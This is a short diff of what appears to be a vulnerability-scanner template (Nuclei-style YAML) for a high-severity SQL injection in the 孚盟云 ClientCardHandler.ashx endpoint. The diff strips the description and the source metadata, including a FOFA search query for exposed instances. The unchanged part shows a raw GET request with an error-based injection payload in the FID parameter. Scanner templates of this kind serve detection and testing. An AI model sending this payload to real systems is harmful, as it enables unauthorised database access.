@@ -3,12 +3,8 @@ info:
   name: 孚盟云 ClientCardHandler.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tn3p71y4vwhw4xcv'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tn3p71y4vwhw4xcv
-    fofa: app="孚盟软件-孚盟云"
 http:
 - raw:
   - 'GET /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=1''+and+1=@@version-- HTTP/1.1
